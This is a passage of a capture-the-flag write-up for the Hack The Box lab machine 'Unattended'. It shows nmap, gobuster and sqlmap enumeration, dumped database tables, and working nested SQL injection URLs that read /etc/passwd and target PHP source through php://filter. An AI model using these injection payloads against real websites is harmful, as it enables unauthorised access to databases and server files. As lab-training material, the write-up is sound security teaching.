<li><a href="#getting-user-guly">Getting user guly</a></li>
<li><a href="#getting-root">Getting root</a></li>
</ul></li>
<li><a href="#autopwn-script">Autopwn script</a></li>
 
      
        <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
      </ul>
    </li>
   </ul>
  
   
  <ul class="nav nav-pills">
      <li><a class="p-logo" href="https://alamot.github.io/"><i class="fa fa-home" aria-hidden="true"></i> <span class="hidden768" lang="en">The Portal of Knowledge</span><span class="hidden768" lang="el">Η Πύλη της Γνώσης</span></a></li>
  </ul>
  
  <ul class="nav nav-pills pull-right topmargin7"> 
    <li id="lang-selector" role="presentation" class="dropdown">
      <a id="lang-index" class="dropdown-toggle btn-primary" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Language <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu">
        <li><a id="en" href="#">English</a></li>
        <li><a id="el" href="#">Ελληνικά</a></li>
      </ul>
    </li>  
  </ul>
</div>
</nav>
<script>
langtext = "English";
language = localStorage.getItem('language');
if (language) {
  document.getElementById('mainbody').setAttribute('class', language);
  document.getElementById('mainbody').setAttribute('lang', language);
  if (language == 'el') { langtext="Ελληνικά"; }
  document.getElementById("lang-index").innerHTML=langtext+' <i class="fa fa-caret-down" aria-hidden="true"></i>';
}
</script>




<div class="container-fluid">
  <div class="row">
    <div class="col-md-12">
      <article class="single centered">
        <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
        <div class="body">
            <header lang="en"><h1 id="title" class="title">Unattended (Hack The Box) write-up</h1></header>
            <header lang="el"><h1 class="title">Ανάλυση του Unattended (Hack The Box)</h1></header>
            <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
            <time lang="en" class="topmargin7">23 Aug 2019</time>
            <time lang="el" class="topmargin7">23 Αυγ 2019</time>
            &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
            
              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
                <span lang="en">Cybersecurity</span>
                <span lang="el">Κυβερνοασφάλεια</span>
              </a>
            
            &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
                <span lang="en">hackthebox</span>
                <span lang="el">hackthebox</span>
                </a>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/linux'>
                <span lang="en">linux</span>
                <span lang="el">linux</span>
                </a>
            
         
         <aside>
          <section>
            <header lang="en"><h2>Contents</h2></header>
            <header lang="el"><h2>Περιεχόμενα</h2></header>
            <div><nav id="TableOfContents">
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
<li><a href="#brute-forcing-directories-and-files">Brute-forcing directories and files</a></li>
</ul></li>
<li><a href="#exploitation">Exploitation</a>
<ul>
<li><a href="#sql-injection">SQL Injection</a></li>
<li><a href="#nested-sql-injection-lfi">Nested SQL Injection (LFI)</a></li>
<li><a href="#lfi-to-rce-via-php-session-poisoning">LFI to RCE (via PHP session poisoning)</a></li>
<li><a href="#getting-user-guly">Getting user guly</a></li>
<li><a href="#getting-root">Getting root</a></li>
</ul></li>
<li><a href="#autopwn-script">Autopwn script</a></li>
</ul>
</nav></div>
          </section>
         </aside>
        
        

<h1 id="introduction">Introduction</h1>

<p><a href="https://www.hackthebox.com/machines/unattended" target="_blank">https://www.hackthebox.com/machines/unattended</a></p>

<p>Unattended is a medium difficulty Linux box which needs a good knowledge of SQL and its programming flaws. A path traversal on the web server can be exploited to get the source code of the PHP pages. A SQL injection flaw is found, which can be exploited using nested unions to gain LFI. The LFI can then be leveraged to RCE via log files or sessions file. Database access allows the www user to change the configuration and inject commands into a cronjob running as a user. The user is a member of the grub group, which has access to the kernel image through which the root password can be obtained.</p>

<h1 id="enumeration">Enumeration</h1>

<h2 id="port-scanning">Port scanning</h2>

<p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">htbscan.py</a></p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo htbscan.py 10.10.10.126
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p1-65535,U:1-65535 --max-rate 500 --interactive 10.10.10.126
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-23 15:11:16 GMT
</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [131070 ports/host]
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 443/tcp on 10.10.10.126                                   
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.126                                    
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo nmap -A -p80,443 10.10.10.126
</span></span></span><span class="line"><span class="cl"><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-23 18:17 EEST
</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for www.nestedflanders.htb (10.10.10.126)
</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.075s latency).
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT    STATE SERVICE  VERSION
</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp  open  http     nginx 1.10.3
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: nginx/1.10.3
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Did not follow redirect to https://www.nestedflanders.htb
</span></span></span><span class="line"><span class="cl"><span class="go">443/tcp open  ssl/http nginx 1.10.3
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: nginx/1.10.3
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Apache2 Debian Default Page: It works
</span></span></span><span class="line"><span class="cl"><span class="go">| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
</span></span></span><span class="line"><span class="cl"><span class="go">| Not valid before: 2018-12-19T09:43:58
</span></span></span><span class="line"><span class="cl"><span class="go">|_Not valid after:  2021-09-13T09:43:58
</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 - 4.6 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 4.8 (91%)
</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
</span></span></span></code></pre></div></div>

<p>We observe that port 80 redirects to <a href="https://www.nestedflanders.htb" target="_blank">https://www.nestedflanders.htb</a> and the commonName of the SSL certificate is also the same. Therefore, we add the following line in our /etc/hosts file:</p>
<pre tabindex="0"><code>10.10.10.126 www.nestedflanders.htb</code></pre>
<h2 id="brute-forcing-directories-and-files">Brute-forcing directories and files</h2>

<p>Now, let&rsquo;s brute-force directories and files using gobuster:</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> gobuster -k -u https://www.nestedflanders.htb -w /opt/DirBuster/directory-list-2.3-medium.txt -t <span class="m">20</span> -x php
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">=====================================================
</span></span></span><span class="line"><span class="cl"><span class="go">Gobuster v2.0.1              OJ Reeves (@TheColonial)
</span></span></span><span class="line"><span class="cl"><span class="go">=====================================================
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Mode         : dir
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Url/Domain   : https://www.nestedflanders.htb/
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Threads      : 20
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Wordlist     : /opt/DirBuster/directory-list-2.3-medium.txt
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Status codes : 200,204,301,302,307,403
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Extensions   : php
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Timeout      : 10s
</span></span></span><span class="line"><span class="cl"><span class="go">=====================================================
</span></span></span><span class="line"><span class="cl"><span class="go">2019/04/30 01:20:35 Starting gobuster
</span></span></span><span class="line"><span class="cl"><span class="go">=====================================================
</span></span></span><span class="line"><span class="cl"><span class="go">/index.php (Status: 200)
</span></span></span><span class="line"><span class="cl"><span class="go">/dev (Status: 301)
</span></span></span></code></pre></div></div>

<h1 id="exploitation">Exploitation</h1>

<h2 id="sql-injection">SQL Injection</h2>

<p>If we visit <a href="https://www.nestedflanders.htb/index.php" target="_blank">https://www.nestedflanders.htb/index.php</a>, we see some interesting links of this pattern: <strong>index.php?id=</strong>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=25&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>main<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=465&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=587&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>contact<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span></span></span></code></pre></div></p>

<p>Let&rsquo;s run sqlmap to test for SQL injections:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">[18:49:08] [INFO] GET parameter &#39;id&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --string=&#34;Feel&#34;)
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">[18:49:24] [INFO] GET parameter &#39;id&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable 
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">sqlmap identified the following injection point(s) with a total of 501 HTTP(s) requests:
</span></span></span><span class="line"><span class="cl"><span class="go">---
</span></span></span><span class="line"><span class="cl"><span class="go">Parameter: id (GET)
</span></span></span><span class="line"><span class="cl"><span class="go">    Type: boolean-based blind
</span></span></span><span class="line"><span class="cl"><span class="go">    Title: AND boolean-based blind - WHERE or HAVING clause
</span></span></span><span class="line"><span class="cl"><span class="go">    Payload: id=465&#39; AND 5708=5708-- sdGB
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Type: time-based blind
</span></span></span><span class="line"><span class="cl"><span class="go">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span></span><span class="line"><span class="cl"><span class="go">    Payload: id=465&#39; AND (SELECT 2816 FROM (SELECT(SLEEP(5)))iVnX)-- orQO
</span></span></span><span class="line"><span class="cl"><span class="go">---
</span></span></span><span class="line"><span class="cl"><span class="go">[18:51:13] [INFO] the back-end DBMS is MySQL
</span></span></span><span class="line"><span class="cl"><span class="go">back-end DBMS: MySQL &gt;= 5.0.12
</span></span></span></code></pre></div></div></p>

<p>Let&rsquo;s see what databases we have:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> --dbs
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">available databases [2]:
</span></span></span><span class="line"><span class="cl"><span class="go">[*] information_schema
</span></span></span><span class="line"><span class="cl"><span class="go">[*] neddy
</span></span></span></code></pre></div></div></p>

<p>Let&rsquo;s see what tables the database &lsquo;neddy&rsquo; have:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> -D neddy --tables
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Database: neddy
</span></span></span><span class="line"><span class="cl"><span class="go">[11 tables]
</span></span></span><span class="line"><span class="cl"><span class="go">+--------------+
</span></span></span><span class="line"><span class="cl"><span class="go">| config       |
</span></span></span><span class="line"><span class="cl"><span class="go">| customers    |
</span></span></span><span class="line"><span class="cl"><span class="go">| employees    |
</span></span></span><span class="line"><span class="cl"><span class="go">| filepath     |
</span></span></span><span class="line"><span class="cl"><span class="go">| idname       |
</span></span></span><span class="line"><span class="cl"><span class="go">| offices      |
</span></span></span><span class="line"><span class="cl"><span class="go">| orderdetails |
</span></span></span><span class="line"><span class="cl"><span class="go">| orders       |
</span></span></span><span class="line"><span class="cl"><span class="go">| payments     |
</span></span></span><span class="line"><span class="cl"><span class="go">| productlines |
</span></span></span><span class="line"><span class="cl"><span class="go">| products     |
</span></span></span><span class="line"><span class="cl"><span class="go">+--------------+
</span></span></span></code></pre></div></div></p>

<p>Well, three databases look very promising (&lsquo;config&rsquo;, &lsquo;filepath&rsquo;, &lsquo;idname&rsquo;). Let&rsquo;s dump and examine them:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> -D neddy -T config --dump
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Database: neddy
</span></span></span><span class="line"><span class="cl"><span class="go">Table: config
</span></span></span><span class="line"><span class="cl"><span class="go">[52 entries]
</span></span></span><span class="line"><span class="cl"><span class="go">+-----+-------------------------+----------------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="go">| id  | option_name             | option_value                                 |
</span></span></span><span class="line"><span class="cl"><span class="go">+-----+-------------------------+----------------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="go">| 54  | offline                 | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 55  | offline_message         | Site offline, please come back later         |
</span></span></span><span class="line"><span class="cl"><span class="go">| 56  | display_offline_message | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 57  | offline_image           | &lt;blank&gt;                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 58  | sitename                | NestedFlanders                               |
</span></span></span><span class="line"><span class="cl"><span class="go">| 59  | editor                  | tinymce                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 60  | captcha                 | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 61  | list_limit              | 20                                           |
</span></span></span><span class="line"><span class="cl"><span class="go">| 62  | access                  | 1                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 63  | debug                   | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 64  | debug_lang              | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 65  | dbtype                  | mysqli                                       |
</span></span></span><span class="line"><span class="cl"><span class="go">| 66  | host                    | localhost                                    |
</span></span></span><span class="line"><span class="cl"><span class="go">| 67  | live_site               | &lt;blank&gt;                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 68  | gzip                    | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 69  | error_reporting         | default                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 70  | ftp_host                | 127.0.0.1                                    |
</span></span></span><span class="line"><span class="cl"><span class="go">| 71  | ftp_port                | 21                                           |
</span></span></span><span class="line"><span class="cl"><span class="go">| 72  | ftp_user                | flanders                                     | 
</span></span></span><span class="line"><span class="cl"><span class="go">| 73  | ftp_pass                | 0e1aff658d8614fd0eac675b...287a94ffcde451466 |
</span></span></span><span class="line"><span class="cl"><span class="go">| 74  | ftp_root                | /                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 75  | ftp_enable              | 1                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 76  | offset                  | UTC                                          |
</span></span></span><span class="line"><span class="cl"><span class="go">| 77  | mailonline              | 1                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 78  | mailer                  | mail                                         |
</span></span></span><span class="line"><span class="cl"><span class="go">| 79  | mailfrom                | nested@nestedflanders.htb                    |
</span></span></span><span class="line"><span class="cl"><span class="go">| 80  | fromname                | Neddy                                        |
</span></span></span><span class="line"><span class="cl"><span class="go">| 81  | sendmail                | /usr/sbin/sendmail                           |
</span></span></span><span class="line"><span class="cl"><span class="go">| 82  | smtpauth                | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 83  | smtpuser                | &lt;blank&gt;                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 84  | smtppass                | &lt;blank&gt;                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 85  | smtppass                | &lt;blank&gt;                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 86  | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;
</span></span></span><span class="line"><span class="cl"><span class="go">| 87  | smtphost                | localhost                                    |
</span></span></span><span class="line"><span class="cl"><span class="go">| 88  | smtpsecure              | none                                         |
</span></span></span><span class="line"><span class="cl"><span class="go">| 89  | smtpport                | 25                                           |
</span></span></span><span class="line"><span class="cl"><span class="go">| 90  | caching                 | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 91  | cache_handler           | file                                         |
</span></span></span><span class="line"><span class="cl"><span class="go">| 92  | cachetime               | 15                                           |
</span></span></span><span class="line"><span class="cl"><span class="go">| 93  | MetaDesc                | &lt;blank&gt;                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 94  | MetaKeys                | &lt;blank&gt;                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 95  | MetaTitle               | 1                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 96  | MetaAuthor              | 1                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 97  | MetaVersion             | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 98  | robots                  | &lt;blank&gt;                                      |
</span></span></span><span class="line"><span class="cl"><span class="go">| 99  | sef                     | 1                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 100 | sef_rewrite             | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 101 | sef_suffix              | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 102 | unicodeslugs            | 0                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 103 | feed_limit              | 10                                           |
</span></span></span><span class="line"><span class="cl"><span class="go">| 104 | lifetime                | 1                                            |
</span></span></span><span class="line"><span class="cl"><span class="go">| 105 | session_handler         | file                                         |
</span></span></span><span class="line"><span class="cl"><span class="go">+-----+-------------------------+----------------------------------------------+
</span></span></span></code></pre></div></div></p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> -D neddy -T filepath --dump
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Database: neddy
</span></span></span><span class="line"><span class="cl"><span class="go">Table: filepath
</span></span></span><span class="line"><span class="cl"><span class="go">[3 entries]
</span></span></span><span class="line"><span class="cl"><span class="go">+---------+--------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="go">| name    | path                                 |
</span></span></span><span class="line"><span class="cl"><span class="go">+---------+--------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="go">| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
</span></span></span><span class="line"><span class="cl"><span class="go">| contact | 0f710bba8d16303a415266af8bb52fcb.php |
</span></span></span><span class="line"><span class="cl"><span class="go">| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
</span></span></span><span class="line"><span class="cl"><span class="go">+---------+--------------------------------------+
</span></span></span></code></pre></div></div>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> -D neddy -T idname --dump
</span></span><span class="line"><span class="cl"><span class="go">Database: neddy
</span></span></span><span class="line"><span class="cl"><span class="go">Table: idname
</span></span></span><span class="line"><span class="cl"><span class="go">[6 entries]
</span></span></span><span class="line"><span class="cl"><span class="go">+-----+-------------+----------+
</span></span></span><span class="line"><span class="cl"><span class="go">| id  | name        | disabled |
</span></span></span><span class="line"><span class="cl"><span class="go">+-----+-------------+----------+
</span></span></span><span class="line"><span class="cl"><span class="go">| 1   | main.php    | 1        |
</span></span></span><span class="line"><span class="cl"><span class="go">| 2   | about.php   | 1        |
</span></span></span><span class="line"><span class="cl"><span class="go">| 3   | contact.php | 1        |
</span></span></span><span class="line"><span class="cl"><span class="go">| 25  | main        | 0        |
</span></span></span><span class="line"><span class="cl"><span class="go">| 465 | about       | 0        |
</span></span></span><span class="line"><span class="cl"><span class="go">| 587 | contact     | 0        |
</span></span></span><span class="line"><span class="cl"><span class="go">+-----+-------------+----------+
</span></span></span></code></pre></div></div>

<p>What do we have here?</p>

<p>Let&rsquo;s start from table &lsquo;idname&rsquo;. This table contains three
columns and six rows. The first three rows have been &ldquo;disabled&rdquo;. The last three
rows have the same id numbers with the links on the site. Interesting.
Moreover, the column &lsquo;name&rsquo; of these rows are the same with the column &lsquo;name&rsquo;
of the table &lsquo;filepath&rsquo;. Probably, this means that those links are loading the
php files defined in the column &lsquo;path&rsquo; of the table &lsquo;filepath&rsquo;.</p>

<p>Indeed if we hit, for example, this url <a href="https://www.nestedflanders.htb/47c1ba4f7b1edf28ea0e2bb250717093.php" target="_blank">https://www.nestedflanders.htb/47c1ba4f7b1edf28ea0e2bb250717093.php</a> we confirm
that we get the &lsquo;about&rsquo; page. In other words, we must have a query, similar to this,
running on the backend:</p>
<pre tabindex="0"><code>SELECT path FROM neddy.filepath WHERE name=(SELECT name FROM neddy.idname WHERE
id=&#39;587&#39;)</code></pre>
<p>Note the nested query (also known as inner query or subquery). Now, what if
there is another SQL injection in the outer query? Could we exploit it using a
nested SQL injection in the inner query? Let&rsquo;s find out.</p>

<h2 id="nested-sql-injection-lfi">Nested SQL Injection (LFI)</h2>

<p>First, let&rsquo;s explore again the initial SQL injection, manually this time.
If we use &lsquo;ORDER BY 1&rsquo;, we get the contact page normally:</p>
<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; ORDER BY 1 --+</code></pre>
<p>But if we use &lsquo;ORDER BY 2&rsquo;, the query results in error and the default index page is showed to us:</p>
<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; ORDER BY 2 --+</code></pre>
<p>Now, let&rsquo;s get things interesting. The inner query should return a name like
&lsquo;contact&rsquo;. What if we replace &lsquo;contact&rsquo; with &lsquo;about&rsquo;:</p>
<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#34; --+</code></pre>
<p>It worked! We got the about page instead of the contact page.</p>

<p>The outer query should return the path of the php file to be loaded. Let&rsquo;s try
the same trick. We have to nest our 2nd SQL injection <code>(about' UNION SELECT
'/etc/passwd' --+)</code> like this:</p>
<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION SELECT &#39;/etc/passwd&#39; --+&#34; --+

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false messagebus:x:105:109::/var/run/dbus:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin guly:x:1000:1000:guly,,,:/home/guly:/bin/bash mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false</code></pre>
<p>Hooray, hooray, it&rsquo;s a holiday!</p>

<p>It&rsquo;s high time to read some source code. If we
want to see the source code of php files, we have to use some kind of filter
conversion (e.g. <code>php://filter/read=convert.base64-encode/resource=</code>) because,
otherwise, it will load/run the php files. Let&rsquo;s
try to read /var/www/html/index.php:</p>
<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION
SELECT &#39;php://filter/read=convert.base64-encode/resource=/var/www/html/index.php&#39; --+&#34; --+

